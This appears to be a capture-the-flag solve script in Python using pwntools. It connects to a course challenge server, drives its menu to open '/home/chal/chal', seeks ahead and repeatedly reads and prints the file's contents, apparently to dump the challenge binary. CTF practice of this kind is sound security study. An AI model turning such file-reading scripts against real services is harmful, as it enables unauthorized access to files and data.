from pwn import *


output = ""
r = remote('edu-ctf.zoolab.org', 10001)
r.recvuntil('> ')
r.sendline('1')
r.recvuntil('filename> ')
r.sendline('/home/chal/chal')
r.recvuntil('> ')
r.sendline('5')
r.recvuntil('> ')
r.sendline('10000')
while 1:
    print(r.recvuntil('5. seek'))
    r.recvuntil('> ')
    r.sendline('2')
    r.recvuntil('> ')
    r.sendline('3')